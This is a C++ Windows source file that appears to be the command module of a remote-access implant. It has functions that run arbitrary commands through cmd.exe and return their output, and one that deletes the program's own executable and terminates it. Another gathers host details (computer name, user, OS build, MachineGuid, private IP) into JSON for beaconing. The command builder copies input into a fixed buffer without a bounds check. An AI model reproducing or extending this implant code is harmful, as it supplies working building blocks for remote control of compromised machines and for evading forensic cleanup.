#include <Lmcons.h>
#include "command.h"
#include "debug.h"
#include "rapidjson/document.h"
#include "rapidjson/writer.h"
#include "rapidjson/stringbuffer.h"

LPBYTE ExecuteCmd(LPCSTR szCmdline, PSIZE_T stOut) {
    // szCmdLine should fit in cmd.exe /c <szCmdLine>
    DEBUG_PRINTF("Executing command: %s\n", szCmdline);
    SECURITY_ATTRIBUTES saAttr;
    HANDLE hPipeRead, hPipeWrite;
    BYTE buffer[4096];
    DWORD dwRead, dwWritten;
    LPBYTE outputBuffer = NULL;

    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0)) {
        DEBUG_PRINTF("Error creating pipe: %d\n", GetLastError());
        return NULL;
    }

    STARTUPINFO siStartInfo;
    PROCESS_INFORMATION piProcInfo;

    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = hPipeWrite;
    siStartInfo.hStdOutput = hPipeWrite;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    // Set up full command line
    // cmd.exe /c <szCmdLine>
    char fullCmdLine[4096];
    strcpy(fullCmdLine, "cmd.exe /c ");
    strcat(fullCmdLine, szCmdline);

    if (!CreateProcess(NULL, (LPSTR)fullCmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &piProcInfo)) {
        DEBUG_PRINTF("Error creating process: %d\n", GetLastError());
        CloseHandle(hPipeRead);
        CloseHandle(hPipeWrite);
        return NULL;
    }

    CloseHandle(hPipeWrite);

    do {
        if (!ReadFile(hPipeRead, buffer, sizeof(buffer), &dwRead, NULL) || dwRead == 0) break;
        outputBuffer = (LPBYTE)realloc(outputBuffer, *stOut + dwRead);
        if (outputBuffer == NULL) {
            DEBUG_PRINTF("Error allocating memory\n");
            CloseHandle(hPipeRead);
            return NULL;
        }
        memcpy(outputBuffer + *stOut, buffer, dwRead);
        *stOut += dwRead;
    } while (true);

    CloseHandle(hPipeRead);
    CloseHandle(piProcInfo.hProcess);
    CloseHandle(piProcInfo.hThread);

    return outputBuffer;
}

LPBYTE ExecuteCmdArgVector(std::vector<std::string> args, PSIZE_T outSize)
{
    std::string cmdLine = "";
    for (auto arg : args) {
        cmdLine += arg + " ";
    }
    return ExecuteCmd(cmdLine.c_str(), outSize);
}

/**
 * Stop this process and remove it from the system
*/
void SelfDestruct()
{
    // get file path, if applicable
    char filePath[MAX_PATH];
    GetModuleFileName(NULL, filePath, MAX_PATH);

    // delete file
    DEBUG_PRINTF("Deleting file: %s\n", filePath);
    DeleteFile(filePath);

    // get process handle
    HANDLE hProcess = GetCurrentProcess();

    // terminate process
    TerminateProcess(hProcess, 0);

    // close process handle
    CloseHandle(hProcess);

    // exit
    exit(0);

}

/**
 * Get basic system information about this system
*/
std::string SysInfo()
{

    // Get computer name
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    GetComputerNameA(computerName, &size);

    // Get username
    char userName[4096];
    DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
    GetUserName(userName, &userNameSize);


    // Get OS version
    OSVERSIONINFOEX osInfo;
    ZeroMemory(&osInfo, sizeof(OSVERSIONINFOEX));
    osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetVersionEx((LPOSVERSIONINFO)&osInfo);

    // Get system info
    SYSTEM_INFO sysInfo;
    ZeroMemory(&sysInfo, sizeof(SYSTEM_INFO));
    GetSystemInfo(&sysInfo);

    // Get machine GUID from Registry
    HKEY hKey;
    char guid[256];
    DWORD guidSize = sizeof(guid);
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        RegQueryValueEx(hKey, "MachineGuid", NULL, NULL, (LPBYTE)&guid, &guidSize);
        RegCloseKey(hKey);
    }

    // Get private IP
    char hostName[256];
    gethostname(hostName, sizeof(hostName));
    hostent* host = gethostbyname(hostName);
    char* ip = inet_ntoa(*(struct in_addr*)*host->h_addr_list);

    rapidjson::Document results;
    results.SetObject();
    rapidjson::Document::AllocatorType& allocator = results.GetAllocator();

    results.AddMember("computerName", rapidjson::Value(computerName, allocator), allocator);
    results.AddMember("userName", rapidjson::Value(userName, allocator), allocator);
    results.AddMember("osVersion", rapidjson::Value((unsigned int)osInfo.dwMajorVersion), allocator);
    results.AddMember("osBuild", rapidjson::Value((unsigned int)osInfo.dwBuildNumber), allocator);
    results.AddMember("osPlatform", rapidjson::Value((unsigned int)sysInfo.wProcessorArchitecture), allocator);
    results.AddMember("numProcessors", rapidjson::Value((unsigned int)sysInfo.dwNumberOfProcessors), allocator);
    results.AddMember("machineGuid", rapidjson::Value(guid, allocator), allocator);
    results.AddMember("privateIp", rapidjson::Value(ip, allocator), allocator);

    rapidjson::StringBuffer buffer;
    rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
    results.Accept(writer);

    return buffer.GetString();

}